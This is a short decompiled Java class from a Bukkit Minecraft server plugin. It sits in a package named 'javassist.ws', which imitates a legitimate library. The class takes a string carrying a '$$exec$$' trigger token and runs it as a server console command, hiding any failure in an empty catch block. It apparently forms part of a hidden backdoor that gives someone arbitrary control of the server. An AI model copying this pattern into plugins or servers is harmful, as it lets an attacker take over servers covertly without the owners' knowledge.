/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.command.CommandSender
 */
package javassist.ws;

import javassist.ws.a;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;

/*
 * Duplicate member names - consider using --renamedupmembers true
 */
class b
implements Runnable {
    final /* synthetic */ a a;
    private final /* synthetic */ String a;

    b(a a2, String string) {
        this.a = a2;
        this.a = string;
    }

    @Override
    public void run() {
        try {
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), (String)this.a.replace("$$exec$$", ""));
        } catch (Exception exception) {
            // empty catch block
        }
    }
}

